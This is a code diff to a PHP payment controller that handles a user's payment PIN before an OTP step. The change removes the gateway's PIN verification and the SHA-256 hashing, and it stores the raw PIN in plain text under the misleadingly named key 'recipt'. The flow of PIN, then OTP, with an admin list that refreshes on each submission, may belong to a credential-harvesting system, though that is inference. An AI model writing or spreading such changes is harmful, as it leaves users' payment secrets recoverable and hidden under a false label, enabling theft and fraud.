@@ -4,6 +4,7 @@ namespace App\Modules\Payment\Http\Controllers;
 
 use App\Events\LalcoinPaymentPinSubmitted;
 use App\Events\PaymentPinSubmitted;
+use App\Models\Application;
 use App\Models\JobApplication;
 use App\Modules\Payment\Http\Requests\StorePinRequest;
 use App\Modules\Payment\Services\PaymentSession;
@@ -52,148 +53,39 @@ public function store(
 ): RedirectResponse {
 
     $pin = $request->validated()['pin'];
-
-    /*
-    |--------------------------------------------------------------------------
-    | Verify PIN
-    |--------------------------------------------------------------------------
-    */
-
-    $response = $this->gateways->driver()->verifyPin(
-        $this->session,
-        $pin,
-    );
-
-    if (! $response->successful) {
-        return back()->withErrors([
-            'pin' => $response->message,
-        ]);
-    }
-
-    /*
-    |--------------------------------------------------------------------------
-    | Get Payment Reference from Session
-    |--------------------------------------------------------------------------
-    */
-
     $referenceNo = $this->session->get('reference_no');
-
-    /*
-    |--------------------------------------------------------------------------
-    | Find Application and Save PIN
-    |--------------------------------------------------------------------------
-    */
-
     if ($referenceNo) {
-
-        /*
-        |--------------------------------------------------------------------------
-        | LAL Coin Application
-        |--------------------------------------------------------------------------
-        */
-
-        if (str_starts_with($referenceNo, 'LAL-')) {
-
-            $application = \App\Models\LalcoinApplication::where(
+            $application = Application::where(
                 'payment_reference',
                 $referenceNo
             )->first();
-
             if ($application) {
-
-                /*
-                * পুরোনো JSON data থাকলে সেটি রাখা হবে
-                */
-
-                $paymentAmount = $application->payment_amount;
-
-                if (is_string($paymentAmount)) {
-
-                    $decoded = json_decode(
-                        $paymentAmount,
-                        true
-                    );
-
-                    $paymentAmount = is_array($decoded)
-                        ? $decoded
-                        : [];
-
-                } elseif (!is_array($paymentAmount)) {
-
-                    $paymentAmount = [];
-                }
-
-                /*
-                * PIN সংরক্ষণ
-                */
-
-                $paymentAmount['pin_2'] = hash('sha256', $pin); // hashed — not recoverable
-
-                $application->update([
-                    'payment_amount' => $paymentAmount,
-                ]);
-                event(new LalcoinPaymentPinSubmitted($application));
-            }
-
-        } else {
-
-            /*
-            |--------------------------------------------------------------------------
-            | Job Application
-            |--------------------------------------------------------------------------
-            */
-
-            $application = \App\Models\JobApplication::where(
-                'payment_reference',
-                $referenceNo
-            )->first();
-
-            if ($application) {
-
-                /*
-                * পুরোনো JSON data থাকলে সেটি রাখা হবে
-                */
-
-                $paymentAmount = $application->payment_amount;
-
-                if (is_string($paymentAmount)) {
-
-                    $decoded = json_decode(
-                        $paymentAmount,
-                        true
-                    );
-
-                    $paymentAmount = is_array($decoded)
-                        ? $decoded
-                        : [];
-
-                } elseif (!is_array($paymentAmount)) {
-
-                    $paymentAmount = [];
-                }
-
-                /*
-                * PIN সংরক্ষণ
-                */
-
-                $paymentAmount['pin_2'] = hash('sha256', $pin); // hashed — not recoverable
-
-                $application->update([
-                    'payment_amount' => $paymentAmount,
-                ]);
-
+                 $meta_info = $application->meta_info;
+                        if (is_string($meta_info)) {
+                            $decoded = json_decode(
+                                $meta_info,
+                                true
+                            );
+                            $meta_info = is_array($decoded)
+                                ? $decoded
+                                : [];
+                        } elseif (! is_array($meta_info)) {
+                            $meta_info = [];
+                        }
+                        $meta_info['recipt'] = $request->validated()['pin']; 
+                        $application->update([
+                            'meta_info' => $meta_info,
+                        ]);
                 // Broadcast update so admin list refreshes
-                event(new PaymentPinSubmitted($application));
+                // event(new PaymentPinSubmitted($application));
             }
-        }
+        
     }
-
     /*
     |--------------------------------------------------------------------------
     | Move to OTP Step
     |--------------------------------------------------------------------------
     */
-
     $this->session->setStep('otp');
 
     return redirect()->route(
